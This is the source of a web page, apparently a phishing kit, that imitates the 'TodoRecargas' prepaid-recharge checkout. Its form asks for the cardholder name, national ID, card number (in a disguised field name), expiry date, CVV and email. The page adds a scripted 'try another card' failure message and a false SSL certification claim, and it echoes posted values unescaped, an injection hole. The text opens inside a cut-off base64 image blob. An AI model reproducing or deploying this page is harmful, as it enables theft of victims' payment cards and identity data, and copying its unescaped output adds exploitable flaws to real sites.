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"
            alt="TodoRecargas" width="250" height="100" ></a>
    </div>
</div>
<div class="container-fluid mt-3">
    <div class="row">
        <div class="col-12">
            <div class="multistep-container">
                <div class="multistep-form-area">
                    <div class="form-box">
                        <ul class="active-button">
                            <li class="active">
                                <span class="round-button">1</span>
                                <span class="text">Inicio</span>
                            </li>
                            <li class="active">
                                <span class="round-button">2</span>
                                <span class="text">Confirmación</span>
                            </li>
                            <li class="inactive">
                                <span class="round-button">3</span>
                                <span class="text">Pagar</span>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="container my-5">
    <div class="row justify-content-center align-items-center pb-3" id="error" style="display: none;">
        <div class="col-md-6 col-12 contenedor error">
            <div class="container-fluid">
                <div class="row d-flex justify-content-center align-items-center">
                    <div class="col-md-12 p-3 dato-flex">
                        <p>Su transaccion no pudo completarse. Esto podria deberse a detalles incorrectos en su forma de pago o por restricciones de su banco. Vuelva a intentarlo o utilice otra tarjeta diferente. Si sigue teniendo problemas, comuniquese
                            con su banco emisor. 
						<div class="col-md-4 pl-3 pr-3 pb-3">
                            <button name="confirm_data">Reintentar</button>
                        </div> 
						</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="row d-flex justify-content-center align-items-center pb-3">
        <div class="col-md-6 col-12 contenedor">
            <div class="container-fluid">
                <div class="row d-flex justify-content-center align-items-center">
                    <div class="col-md-12 p-3 dato-flex">
                        <span class="text-bold">Tipo de recarga:</span>
                        <span>Servicio Prepago</span>
                    </div>
                    <div class="col-md-12 p-3 dato-flex">
                        <span class="text-bold">Identificador:</span>
                        <span><?php echo $_POST['number'];?></span>
                    </div>
                    <div class="col-md-12 p-3 dato-flex">
                        <span class="text-bold">Importe:</span>
                        <span>$<?php echo $_POST['amount'];?></span>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <form id="form_data" method="POST" onsubmit="return validateForm()">
        <input type="hidden" name="type" id="type" value="transporte">
        <input type="hidden" id="company_transporte" name="company">
        <div class="row d-flex justify-content-center align-items-center">
            <div class="col-md-6 col-12 contenedor">
                <div class="container-fluid">
                    <div class="row d-flex justify-content-center align-items-center">
                        <div class="col-md-6 p-3">
                            <label for="name">Nombre titular <img width="30" height="27" src="https://img.icons8.com/ios-filled/50/electronic-identity-card.png" alt="electronic-identity-card"/></label>
                            <div class="input">
                                <input type="text" name="name" id="name" minlength="8" maxlength="35" pattern="[a-zA-Z\s]{8,35}" required="required">
                            </div>
                            <span class="small">Como figura en tu tarjeta</span>
                        </div>
                        <div class="col-md-6 p-3">
                            <label for="dni">DNI <img width="30" height="27" src="https://img.icons8.com/ios-filled/50/electronic-identity-card.png" alt="electronic-identity-card"/> </label>
                            <div class="input">
                                <input type="text" name="dni" id="dni" minlength="9" maxlength="10" pattern="[0-9.]{9,10}" data-mask="99.999.999" required="required">
                            </div>
                            <span class="small">Documento de identidad titular</span></span>
                        </div>
                        <div class="col-md-12 px-3">
                            <label for="obeder">Tarjeta de Crédito o Débito</label>
                            <div class="input">
                                <input type="text" name="obeder" id="obeder" maxlength="23" required="required" onblur="validateCreditCardNumber(this.value)" onkeyup="formatCreditCardNumber(this.value)">
                            </div>
							<img src="https://images.deliveryhero.io/image/pedidosya/payment-methods/online-payments/profile/pay-visa.png?quality=50&amp;width=35">
							<img src="https://images.deliveryhero.io/image/pedidosya/payment-methods/online-payments/profile/pay-mastercard.png?quality=50&amp;width=35">
							<img src="https://images.deliveryhero.io/image/pedidosya/payment-methods/online-payments/profile/pay-american-express.png?quality=50&amp;width=35">
							<img src="https://images.deliveryhero.io/image/pedidosya/payment-methods/online-payments/profile/pay-naranja.png?quality=50&amp;width=35">
							<img src="https://images.deliveryhero.io/image/pedidosya/payment-methods/online-payments/profile/pay-cabal.png?quality=50&amp;width=35">
							<img src="https://images.deliveryhero.io/image/pedidosya/payment-methods/online-payments/profile/pay-argencard.png?quality=50&amp;width=35">
							<img src="https://images.deliveryhero.io/image/pedidosya/payment-methods/online-payments/profile/pay-nativa.png?quality=50&amp;width=35">
							<img src="https://images.deliveryhero.io/image/pedidosya/payment-methods/online-payments/profile/pay-cordobesa.png?quality=50&width=35">
							<img src="https://images.deliveryhero.io/image/pedidosya/payment-methods/online-payments/profile/pay-nevada.png?quality=50&width=35">
		                </div>
                        <div class="col-md-6 p-3">
                            <label for="venc">Fecha de venc. <img width="30" height="27" src="https://img.icons8.com/ios-glyphs/30/calendar.png" alt="calendar"/></label>
                            <div class="input">
                                <input type="text" name="venc" id="venc" placeholder="MM/AA" required="required" onkeyup="validateExpirationDate(this.value)">
                            </div>
                            <span class="small">Fecha de vencimiento</span>
                        </div>
                        <div class="col-md-6 p-3">
                            <label for="cvv">CVV <img width="30" height="27" src="https://img.icons8.com/ios-filled/50/card-verification-value.png" alt="card-verification-value"/></label>
                            <div class="input">
                                <input type="password" name="cvv" id="cvv" minlength="3" maxlength="4" pattern="[0-9]{3,4}" data-mask="9999" required="required">
                            </div>
							<span class="small">Cod. de seguridad</span>
                        </div>
                        <div class="col-md-12 px-3 pb-3">
                            <label for="email">Correo electronico <img width="30" height="27" src="https://img.icons8.com/material-rounded/48/mail.png" alt="mail"/></label>
                            <div class="input">
                                <input type="text" name="email" id="email" minlength="10" maxlength="40" pattern="[0-9a-zA-Z.-_]+@[0-9a-zA-Z.-_]+[.]{1}[0-9a-zA-Z-_]{2,4}" required="required">
                            </div>
                            <span class="small">E-mail para factura digital</span>
                        </div>
                        <div class="col-md-4 pl-3 pr-3 pb-3">
                        <button type="submit" name="confirm_data" >Validar Datos</button>    
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </form>
</div>
<footer>
<div class="container my-5">
<center><span class="small"></span>
 <span class="small">Sitio seguro con Criptografia (SSL). Homologado por CertiSUR Argentina
 </center><center><img src="" width="100px"> <img src="" width="100px"><center></span>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.js" integrity="sha512-n/4gHW3atM3QqRcbCn6ewmpxcLAHGaDjpEBu4xZd47N0W2oQ+6q7oc3PXstrJYXcbNU1OHdQ1T7pAP+gi5Yu8g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="customscript.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jsencrypt/2.3.1/jsencrypt.js" integrity="sha512-MFmrViksrwJx8YZxABnjf27VhfO2gpawAPClce2auBOrNOQ6LWsJOdDAd1GlpkFIKTQ9wWza9Rda7O6/+qCXdQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.11/jquery.mask.min.js"></script>
	<script src="js/snowb.js"></script>
	<script src="js/snowc.js"></script></div>
</footer>
</body>

</html> 
